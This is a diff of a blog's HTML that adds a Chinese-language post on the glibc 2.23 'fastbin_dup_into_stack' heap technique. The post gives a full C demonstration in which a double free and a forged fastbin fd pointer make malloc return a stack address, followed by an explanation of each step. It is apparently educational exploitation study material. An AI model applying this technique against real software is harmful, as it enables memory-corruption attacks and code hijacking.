@@ -71,6 +71,47 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-glibc_2.23_fastbin_dup_into_stack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/11/glibc_2.23_fastbin_dup_into_stack/" class="article-date">
+  <time class="dt-published" datetime="2026-03-11T03:34:48.360Z" itemprop="datePublished">2026-03-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/03/11/glibc_2.23_fastbin_dup_into_stack/">glibc_2.23下的fastbin_dup_into_stack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>doublefree是我们一开始学堆利用时最常听到的一个词，这个示例解释了doublefree其实不是目的，而是桥梁。<br>这个示例讲述了用doublefree使得malloc不再份额份分配堆内存，而是返回一个栈地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造fastbin布局<br>a-&gt;b-&gt;a-&gt;null<br>经过两次malloc：<br>a-&gt;null<br>此时手上有a和b的地址，且a和b都是allocated。能够合法修改a的fd。<br>如果不经过doublefree，直接申请a，修改其fd，free后其fd会被glibc覆盖，等于白改。<br>所以这就是为什么要doublefree。doublefree只是桥梁，不是目的。<br>stack_var被设置为了0x20，这个地方表示堆块的size，符合fastbin要求，经过malloc检测，那么，malloc自然就会返回&amp;stack_var + 8的地址。<br>&amp;stack_var - 8: glibc看到的堆块头部<br>&amp;stack_var: 堆块头的size字段 设置为0x20，最后标志位为0,表示堆块未被使用<br>&amp;stack_var + 8: 用户层面看到的堆块头部，由malloc返回给用户。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/11/glibc_2.23_fastbin_dup_into_stack/" data-id="cmmlrz60n0000gbq20cktdtwl" data-title="glibc_2.23下的fastbin_dup_into_stack" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-楚慧杯初赛2026_house" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/03/10/%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9B2026_house/" class="article-date">
@@ -396,6 +437,10 @@
       <ul>
         
           <li>
+            <a href="/2026/03/11/glibc_2.23_fastbin_dup_into_stack/">glibc_2.23下的fastbin_dup_into_stack</a>
+          </li>
+        
+          <li>
             <a href="/2026/03/10/%E6%A5%9A%E6%85%A7%E6%9D%AF%E5%88%9D%E8%B5%9B2026_house/">楚慧杯初赛2026_house</a>
           </li>
         
@@ -409,10 +454,6 @@
         
           <li>
             <a href="/2026/03/06/unsorted_bin_attack/">glibc_2.23下的unsorted_bin_attack</a>
-          </li>
-        
-          <li>
-            <a href="/2026/03/04/fastbin_dup_consolidate/">glibc_2.23下的堆利用链fastbin_dup_consolidate</a>
           </li>
         
       </ul>
